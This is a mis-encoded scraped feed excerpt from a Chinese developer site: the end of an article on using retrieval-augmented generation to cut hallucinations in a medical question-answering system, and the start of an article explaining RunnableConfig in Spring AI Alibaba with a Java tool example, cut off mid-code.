<table><thead><tr><th>è¯„ä¼°ç»´åº¦</th><th>åŸå§‹æ¨¡å‹</th><th>RAGå¢å¼º</th><th>æå‡å¹…åº¦</th></tr></thead><tbody><tr><td>å¹»è§‰ç‡</td><td>38.2%</td><td>5.7%</td><td>â–¼85%</td></tr><tr><td>äº‹å®å‡†ç¡®ç‡</td><td>61.8%</td><td>90.3%</td><td>â–²47%</td></tr><tr><td>ç”¨æˆ·æ»¡æ„åº¦</td><td>2.8/5</td><td>4.5/5</td><td>â–²61%</td></tr></tbody></table>
<h3 data-id="heading-11">å››ã€ç”Ÿäº§ç¯å¢ƒä¼˜åŒ–ç­–ç•¥</h3>
<h4 data-id="heading-12">4.1 æ··åˆæ£€ç´¢æ¶æ„</h4>
<p>å•ä¸€å‘é‡æ£€ç´¢åœ¨ç²¾ç¡®æœ¯è¯­æŸ¥è¯¢æ—¶å¯èƒ½å¤±æ•ˆï¼Œéœ€ç»“åˆå…³é”®è¯æ£€ç´¢ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[ç”¨æˆ·é—®é¢˜] --&gt; B{é—®é¢˜ç±»å‹åˆ†æ}
    B --&gt;|ä¸“ä¸šæœ¯è¯­| C[å…³é”®è¯æ£€ç´¢]
    B --&gt;|è¯­ä¹‰æŸ¥è¯¢| D[å‘é‡æ£€ç´¢]
    C &amp; D --&gt; E[ç»“æœèåˆ]
    E --&gt; F[ç”Ÿæˆç­”æ¡ˆ]
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ··åˆæ£€ç´¢å®ç°</span>
<span class="hljs-keyword">from</span> langchain_community.retrievers <span class="hljs-keyword">import</span> BM25Retriever

<span class="hljs-comment"># åˆå§‹åŒ–åŒæ£€ç´¢å™¨</span>
keyword_retriever = BM25Retriever.from_texts(docs)
vector_retriever = Pinecone.from_existing_index(...)

<span class="hljs-comment"># è‡ªå®šä¹‰èåˆå™¨</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">hybrid_search</span>(<span class="hljs-params">query</span>):
    keyword_results = keyword_retriever.get_relevant_documents(query)
    vector_results = vector_retriever.get_relevant_documents(query)
    <span class="hljs-keyword">return</span> fusion_results(keyword_results, vector_results)
</code></pre>
<h4 data-id="heading-13">4.2 åŠ¨æ€æ¸©åº¦è°ƒèŠ‚</h4>
<p>é€šè¿‡æ¸©åº¦å‚æ•°æ§åˆ¶ç”Ÿæˆè‡ªç”±åº¦ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ ¹æ®é—®é¢˜é£é™©çº§åˆ«è°ƒæ•´æ¸©åº¦</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">safety_aware_generation</span>(<span class="hljs-params">question</span>):
    risk_level = safety_checker(question)
    temperature = <span class="hljs-number">0.3</span> <span class="hljs-keyword">if</span> risk_level == <span class="hljs-string">"high"</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0.7</span>
    <span class="hljs-keyword">return</span> llm.invoke(prompt, config={<span class="hljs-string">"temperature"</span>: temperature})
</code></pre>
<h4 data-id="heading-14">4.3 æº¯æºéªŒè¯æœºåˆ¶</h4>
<p>å¼ºåˆ¶æ¨¡å‹æ ‡æ³¨å¼•ç”¨æ¥æºï¼š</p>
<pre><code class="hljs language-python" lang="python">prompt_template = <span class="hljs-string">"""
è¯·åŸºäºä»¥ä¸‹è¯æ®å›ç­”é—®é¢˜ï¼š
{{context}}

è¦æ±‚ï¼š
1. æ¯ä¸ªåŒ»å­¦å£°æ˜å¿…é¡»æ ‡æ³¨æ¥æºç¼–å·ï¼Œå¦‚[1]
2. ç¦æ­¢æ·»åŠ ä»»ä½•éå¼•ç”¨å†…å®¹
3. è‹¥æ— æ³•å›ç­”è¯·è¯´"æ ¹æ®ç°æœ‰èµ„æ–™æ— æ³•å›ç­”"
"""</span>
</code></pre>
<h3 data-id="heading-15">äº”ã€å‰æ²¿æ‰©å±•æ–¹å‘</h3>
<h4 data-id="heading-16">5.1 è‡ªæˆ‘ä¿®æ­£RAG</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªä¿®æ­£æµç¨‹ä¼ªä»£ç </span>
initial_answer = rag_chain(question)
verification = fact_checker(question, initial_answer)
<span class="hljs-keyword">if</span> verification.confidence &lt; <span class="hljs-number">0.9</span>:
    new_context = retrieve_more_docs(verification.gaps)
    final_answer = rag_chain(question, new_context)
</code></pre>
<h4 data-id="heading-17">5.2 å¤šæ¨¡æ€RAG</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å¤„ç†åŒ»å­¦å½±åƒæ–‡æœ¬</span>
image_retriever = CLIPRetriever(image_database)
text_retriever = VectorRetriever(text_database)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">multimodal_rag</span>(<span class="hljs-params">question, image=<span class="hljs-literal">None</span></span>):
    <span class="hljs-keyword">if</span> image:
        image_context = image_retriever(image)
    text_context = text_retriever(question)
    <span class="hljs-keyword">return</span> generate_with_both_contexts(image_context, text_context)
</code></pre>
<h3 data-id="heading-18">å…­ã€è¡€æ³ªæ•™è®­æ€»ç»“</h3>
<ol>
<li>
<p><strong>çŸ¥è¯†åº“æ›´æ–°æœºåˆ¶</strong>ï¼šæŸæ¬¡è¯å“è¯´æ˜ä¹¦æ›´æ–°æœªåŒæ­¥ï¼Œå¯¼è‡´ç³»ç»Ÿæ¨èç¦ç”¨è¯å‰‚</p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šå»ºç«‹çŸ¥è¯†åº“å˜æ›´è‡ªåŠ¨è§¦å‘é‡ç´¢å¼•æµæ°´çº¿</li>
</ul>
</li>
<li>
<p><strong>æ£€ç´¢å¤±è´¥å…œåº•</strong>ï¼šå½“æ£€ç´¢è¿”å›ç©ºæ—¶ï¼ŒåŸå§‹æ¨¡å‹ç›´æ¥èƒ¡ç¼–ä¹±é€ </p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šæ·»åŠ ç©ºç»“æœæ£€æµ‹ï¼Œè§¦å‘"èµ„æ–™ä¸è¶³"å“åº”æ¨¡æ¿</li>
</ul>
</li>
<li>
<p><strong>è¿‡åº¦ä¾èµ–é£é™©</strong>ï¼šåŒ»ç”Ÿå°†ç³»ç»Ÿç­”æ¡ˆè§†ä¸ºç»å¯¹çœŸç†</p>
<ul>
<li>âœ… è§£å†³æ–¹æ¡ˆï¼šåœ¨æ‰€æœ‰å›ç­”æ·»åŠ "æœ¬å»ºè®®éœ€ä¸“ä¸šåŒ»å¸ˆç¡®è®¤"è­¦ç¤ºè¯­</li>
</ul>
</li>
</ol>
<h3 data-id="heading-19">ä¸ƒã€æ€è€ƒé¢˜</h3>
<ol>
<li><strong>ä¼¦ç†å›°å¢ƒ</strong>ï¼šå½“RAGç³»ç»Ÿæ£€ç´¢åˆ°ç›¸äº’å†²çªçš„åŒ»å­¦æ–‡çŒ®æ—¶ï¼ˆå¦‚æ–°æ—§ç‰ˆæŒ‡å—çŸ›ç›¾ï¼‰ï¼Œç³»ç»Ÿåº”å¦‚ä½•åº”å¯¹ï¼Ÿ</li>
<li><strong>æŠ€æœ¯æé™</strong>ï¼šèƒ½å¦è®¾è®¡å‡º100%æ— å¹»è§‰çš„AIç³»ç»Ÿï¼Ÿç†è®ºä¸Šçš„ä¸å¯èƒ½æ€§æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</li>
<li><strong>æˆæœ¬å¹³è¡¡</strong>ï¼šåœ¨å®æ—¶æ€§è¦æ±‚æé«˜çš„æ€¥è¯Šåœºæ™¯ï¼Œå¦‚ä½•å¹³è¡¡RAGçš„æ£€ç´¢è€—æ—¶ä¸ç”Ÿå‘½å®‰å…¨ï¼Ÿ</li>
</ol>
<blockquote>
<p><strong>æœ€åå¿ å‘Š</strong>ï¼šRAGä¸æ˜¯æ¶ˆé™¤å¹»è§‰çš„é“¶å¼¹ï¼Œè€Œæ˜¯äººç±»æ™ºæ…§ä¸AIåä½œçš„æ¡¥æ¢ã€‚æœ€å±é™©çš„å¹»è§‰ï¼Œæ˜¯è®¤ä¸ºAIå¯ä»¥æ›¿ä»£ä¸“ä¸šåˆ¤æ–­ã€‚</p>
</blockquote>
<hr/>
<p><strong>é™„å½•ï¼šå®Œæ•´RAGç³»ç»Ÿéƒ¨ç½²æ¸…å•</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²æ£€æŸ¥è¡¨</span>
deployment_checklist = [
    <span class="hljs-string">"âœ… çŸ¥è¯†åº“ç‰ˆæœ¬é”å®šæœºåˆ¶"</span>,
    <span class="hljs-string">"âœ… æ£€ç´¢å¤±è´¥å…œåº•ç­–ç•¥"</span>,
    <span class="hljs-string">"âœ… ç”¨æˆ·é£é™©æç¤ºæ¨¡æ¿"</span>,
    <span class="hljs-string">"âœ… å®æ—¶ç›‘æ§ä»ªè¡¨ç›˜"</span>,
    <span class="hljs-string">"âœ… äººå·¥å®¡æ ¸é€šé“"</span>,
    <span class="hljs-string">"âš ï¸ å®šæœŸåŒ»å­¦ä¸“å®¶éªŒè¯"</span>
]
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig]]></title>    <link>https://juejin.cn/post/7592816646869352457</link>    <guid>https://juejin.cn/post/7592816646869352457</guid>    <pubDate>2026-01-08T07:45:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592816646869352457" data-draft-id="7592424951660019738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,æ¶æ„,GitHub"/> <meta itemprop="datePublished" content="2026-01-08T07:45:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æƒ³ç”¨offeræ‰“ç‰Œ"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€ç«™å¼è®²æ¸…Spring AI Alibabaçš„OverAllStateå’ŒRunnableConfig
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æƒ³ç”¨offeræ‰“ç‰Œ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:45:12.000Z" title="Thu Jan 08 2026 07:45:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨ Spring AI Alibabaï¼ˆä»¥åŠæ›´å¹¿æ³›çš„ Spring AI å’Œ LangChain ç”Ÿæ€ç³»ç»Ÿï¼‰ä¸­ï¼Œ<code>RunnableConfig</code> å’Œ <code>OverallState</code>æ˜¯æ„å»ºAgentï¼ˆæ™ºèƒ½ä½“ï¼‰æˆ–Workflowï¼ˆå·¥ä½œæµï¼‰æ—¶çš„ä¸¤ä¸ªæ ¸å¿ƒæ¦‚å¿µï¼Œé‚£å®ƒä»¬åˆ°åº•æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ</p>
<h2 data-id="heading-1">RunnableConfig (è¿è¡Œæ—¶é…ç½®)</h2>
<p><code>RunnableConfig</code> æ˜¯ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œç”¨äºåœ¨æ‰§è¡Œé“¾ï¼ˆChainï¼‰æˆ– Agent çš„å„ä¸ªæ­¥éª¤ä¹‹é—´ä¼ é€’<strong>è¿è¡Œæ—¶</strong>çš„å…ƒæ•°æ®å’Œæ§åˆ¶å‚æ•°ã€‚å®ƒç±»ä¼¼äºä¸€ä¸ªâ€œèƒŒåŒ…â€ï¼Œä¼´éšç€è¯·æ±‚åœ¨æ•´ä¸ªç³»ç»Ÿä¸­æµåŠ¨ï¼Œä½†å®ƒä¸åŒ…å«ä¸šåŠ¡æ•°æ®ï¼ŒåªåŒ…å«â€œå¦‚ä½•æ‰§è¡Œâ€çš„æŒ‡ä»¤ä¸å‚æ•°ã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒä½œç”¨ï¼š</h3>
<ol>
<li>
<p><strong>æ§åˆ¶é€’å½’ä¸å¾ªç¯ (Recursion Limit)</strong> ï¼š</p>
<ul>
<li>åœ¨ Agent å¾ªç¯ï¼ˆä¾‹å¦‚ï¼šæ€è€ƒ -&gt; å·¥å…· -&gt; æ€è€ƒï¼‰ä¸­ï¼Œä¸ºäº†é˜²æ­¢æ­»å¾ªç¯ï¼Œ<code>RunnableConfig</code> å¯ä»¥è®¾ç½®æœ€å¤§é€’å½’æ¬¡æ•°ï¼ˆä¾‹å¦‚ 25 æ¬¡ï¼‰ã€‚å¦‚æœè¶…è¿‡è¿™ä¸ªæ¬¡æ•°ï¼Œç³»ç»Ÿä¼šå¼ºåˆ¶åœæ­¢å¹¶æŠ¥é”™ã€‚</li>
</ul>
</li>
<li>
<p><strong>å›è°ƒæœºåˆ¶ (Callbacks)</strong> ï¼š</p>
<ul>
<li>å®ƒæºå¸¦äº† <code>CallbackManager</code>ã€‚ä½ å¯ä»¥é€šè¿‡å®ƒæŒ‚è½½ç›‘å¬å™¨ï¼Œç›‘æ§ Token æ¶ˆè€—ã€æµå¼è¾“å‡ºï¼ˆStreamingï¼‰ã€æˆ–è€…åœ¨æŸä¸ªæ­¥éª¤å¼€å§‹/ç»“æŸæ—¶è§¦å‘æ—¥å¿—ã€‚</li>
</ul>
</li>
<li>
<p><strong>å…ƒæ•°æ®ä¸è¿½è¸ª (Metadata &amp; Tags)</strong> ï¼š</p>
<ul>
<li>ä½ å¯ä»¥ç»™å½“å‰çš„æ‰§è¡Œè¯·æ±‚æ‰“ä¸Š <code>tags</code>ï¼ˆæ ‡ç­¾ï¼‰æˆ– <code>metadata</code>ï¼ˆå…ƒæ•°æ®ï¼‰ã€‚è¿™å¯¹äºé“¾è·¯è¿½è¸ªï¼ˆå¦‚æ¥å…¥ LangSmith æˆ– Zipkinï¼‰éå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œæ ‡è®° <code>userId: 123</code> æˆ– <code>environment: production</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>å¹¶å‘æ§åˆ¶ä¸è¶…æ—¶</strong>ï¼š</p>
<ul>
<li>åœ¨æŸäº›å®ç°ä¸­ï¼Œå®ƒå¯ä»¥æºå¸¦å–æ¶ˆä¿¡å·ï¼ˆCancellation Signalsï¼‰æˆ–è¶…æ—¶è®¾ç½®</li>
</ul>
</li>
</ol>
<h3 data-id="heading-3">å…³é”®ç†è§£</h3>
<p>ä½ å¯ä»¥å°†RunnableConfigç†è§£ä¸ºâ€œæ˜¾å¼çš„ã€è·¨çº¿ç¨‹å®‰å…¨çš„ ThreadLocalâ€ã€‚</p>
<p>åœ¨ Spring AI / LangChain çš„æ¶æ„ä¸­ï¼Œ<code>RunnableConfig</code> èµ·åˆ°äº†åŒæ ·çš„ä½œç”¨ï¼š</p>
<ul>
<li><strong>éšå¼ä¼ é€’</strong>ï¼šè™½ç„¶å®ƒä½œä¸ºå‚æ•°ä¼ é€’ï¼Œä½†åœ¨ Agent çš„å†…éƒ¨ç»„ä»¶ï¼ˆå¦‚å„ä¸ª Toolã€å„ä¸ª Chain èŠ‚ç‚¹ï¼‰ä¹‹é—´ï¼Œå®ƒå¾€å¾€æ˜¯ä½œä¸ºä¸€ä¸ªâ€œç¯å¢ƒä¸Šä¸‹æ–‡â€å­˜åœ¨çš„ã€‚</li>
<li><strong>å­˜æ”¾â€œå¸¦å¤–æ•°æ®â€ (Out-of-band Data)</strong> ï¼šå®ƒä¸“é—¨è®¾è®¡äº†ä¸€ä¸ª <code>metadata</code> å­—æ®µï¼ˆæ˜¯ä¸€ä¸ª Mapï¼‰ï¼Œå…è®¸ä½ å¾€é‡Œé¢å¡ä¸€äº›<strong>éä¸šåŠ¡é€»è¾‘æ ¸å¿ƒã€ä½†å…¨é“¾è·¯éƒ½éœ€è¦</strong>çš„æ•°æ®ã€‚</li>
</ul>
<h4 data-id="heading-4">å¼‚æ­¥ä¸è·¨çº¿ç¨‹å®‰å…¨æ€§ (è¿™æ˜¯æœ€å¤§çš„åŒºåˆ«)</h4>
<ul>
<li><strong>ThreadLocal</strong>: å®ƒæ˜¯ç»‘å®šåœ¨<strong>ç‰¹å®šçº¿ç¨‹</strong>ä¸Šçš„ã€‚Spring AI åº•å±‚ï¼ˆç‰¹åˆ«æ˜¯åœ¨æµå¼è¾“å‡º Streaming æˆ–è°ƒç”¨å¤§æ¨¡å‹ API æ—¶ï¼‰ç»å¸¸æ˜¯<strong>å¼‚æ­¥çš„</strong>ï¼ˆä½¿ç”¨ <code>WebFlux</code> æˆ– <code>CompletableFuture</code>ï¼‰ã€‚ä¸€æ—¦ä»£ç åˆ‡æ¢äº†çº¿ç¨‹ï¼ˆä¾‹å¦‚ä» Tomcat çº¿ç¨‹åˆ‡æ¢åˆ° Netty I/O çº¿ç¨‹ï¼‰ï¼Œ<code>ThreadLocal</code> é‡Œçš„æ•°æ®å°±ä¼šä¸¢å¤±ï¼Œé™¤éä½ åšéå¸¸å¤æ‚çš„ Context å¤åˆ¶ã€‚</li>
<li><strong>RunnableConfig</strong>: å®ƒæ˜¯ä¸€ä¸ªæ™®é€šçš„ <strong>Java å¯¹è±¡</strong>ã€‚å½“ AI ä»»åŠ¡åœ¨ä¸åŒçš„çº¿ç¨‹ã€ä¸åŒçš„ Reactor æµä¹‹é—´ä¼ é€’æ—¶ï¼Œè¿™ä¸ªå¯¹è±¡ä¼šä½œä¸ºä¸€ä¸ªå‚æ•°ä¸€ç›´è·Ÿç€èµ°ã€‚<strong>æ— è®ºçº¿ç¨‹æ€ä¹ˆåˆ‡ï¼Œæ•°æ®éƒ½åœ¨é‚£é‡Œï¼Œä¸ä¼šä¸¢ã€‚</strong></li>
</ul>
<h4 data-id="heading-5">ä½œç”¨åŸŸæ¸…æ™° (Scope)</h4>
<ul>
<li><strong>ThreadLocal</strong>: å¦‚æœå¿˜è®° <code>remove()</code>ï¼Œå®¹æ˜“é€ æˆå†…å­˜æ³„æ¼ï¼ˆMemory Leakï¼‰ï¼Œæˆ–è€…åœ¨çº¿ç¨‹æ± å¤ç”¨æ—¶é€ æˆæ•°æ®æ±¡æŸ“ï¼ˆä¸Šä¸€ä¸ªè¯·æ±‚çš„æ•°æ®ç•™åˆ°äº†ä¸‹ä¸€ä¸ªè¯·æ±‚ï¼‰ã€‚</li>
<li><strong>RunnableConfig</strong>: å®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸¥æ ¼ç»‘å®šåœ¨å•æ¬¡æ‰§è¡Œé“¾ï¼ˆRunï¼‰ä¸Šã€‚ä¹Ÿå°±æ˜¯ <code>agent.invoke()</code> ç»“æŸï¼Œè¿™ä¸ª Config å¯¹è±¡ä¹Ÿå°±å®Œæˆäº†ä½¿å‘½ï¼Œè¢« GC å›æ”¶ï¼Œéå¸¸å¹²å‡€</li>
</ul>
<h3 data-id="heading-6">ç¤ºä¾‹</h3>
<p>ä¸‹é¢æ˜¯Spring AI Alibabaçš„ä¸€æ®µç¤ºä¾‹</p>
<ol>
<li>
<p>ä» <code>toolContext.getContext()</code> ä¸­å–å‡º <code>RunnableConfig</code></p>
</li>
<li>
<p>ä»ä¸­è¯»å– <code>metadata("user_id")</code></p>
</li>
<li>
<p>æ ¹æ®user_id</p>
<p>è¿”å›ä¸åŒä½ç½®ï¼š</p>
<ul>
<li>ç”¨æˆ· ID ä¸º <code>"1"</code> â†’ <code>"Florida"</code></li>
<li>å…¶ä»– â†’ <code>"San Francisco"</code></li>
</ul>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·ä½ç½®å·¥å…· - ä½¿ç”¨ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserLocationTool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BiFunction</span>&lt;String, ToolContext, String&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">apply</span><span class="hljs-params">(
        <span class="hljs-meta">@ToolParam(description = "User query")</span> String query,
        ToolContext toolContext)</span> {
        <span class="hljs-comment">// ä»ä¸Šä¸‹æ–‡ä¸­è·å–ç”¨æˆ·ä¿¡æ¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
        <span class="hljs-keyword">if</span> (toolContext != <span class="hljs-literal">null</span> &amp;&amp; toolContext.getContext() != <span class="hljs-literal">null</span>) {
			<span class="hljs-type">RunnableConfig</span> <span class="hljs-variable">runnableConfig</span> <span class="hljs-operator">=</span> (RunnableConfig) toolContext.getContext().get(AGENT_CONFIG_CONTEXT_KEY);
			Optional&lt;Object&gt; userIdObjOptional = runnableConfig.metadata(<span class="hljs-string">"user_id"</span>);
			<span class="hljs-keyword">if</span> (userIdObjOptional.isPresent()) {
				userId = (String) userIdObjOptional.get();
			}
		}
		<span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
			userId = <span class="hljs-string">"1"</span>;
		}
        <span class="hljs-keyword">return</span> <span class="hljs-string">"1"</span>.equals(userId) ? <span class="hljs-string">"Florida"</span> : <span class="hljs-string">"San Francisco"</span>;
    }
}
</code></pre>
<p><code>RunnableConfig</code>Â æä¾›äº†ä¸€ä¸ªÂ <code>context()</code>Â æ–¹æ³•ï¼Œå…è®¸ä½ åœ¨åŒä¸€ä¸ªæ‰§è¡Œæµç¨‹ä¸­çš„å¤šä¸ª Hook è°ƒç”¨ã€å¤šè½®æ¨¡å‹æˆ–å·¥å…·è°ƒç”¨ä¹‹é—´å…±äº«æ•°æ®ã€‚è¿™å¯¹äºå®ç°è®¡æ•°å™¨ã€ç´¯ç§¯ç»Ÿè®¡ä¿¡æ¯æˆ–è·¨å¤šæ¬¡è°ƒç”¨ç»´æŠ¤çŠ¶æ€éå¸¸æœ‰ç”¨ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>è·Ÿè¸ªæ¨¡å‹æˆ–å·¥å…·è°ƒç”¨æ¬¡æ•°</li>
<li>ç´¯ç§¯æ€§èƒ½æŒ‡æ ‡ï¼ˆæ€»è€—æ—¶ã€å¹³å‡å“åº”æ—¶é—´ç­‰ï¼‰</li>
<li>åœ¨ before/after Hook ä¹‹é—´ä¼ é€’ä¸´æ—¶æ•°æ®</li>
<li>å®ç°åŸºäºè®¡æ•°çš„é™æµæˆ–æ–­è·¯å™¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨ RunnableConfig.context() å®ç°è°ƒç”¨è®¡æ•°å™¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@HookPositions({HookPosition.BEFORE_MODEL, HookPosition.AFTER_MODEL})</span>  
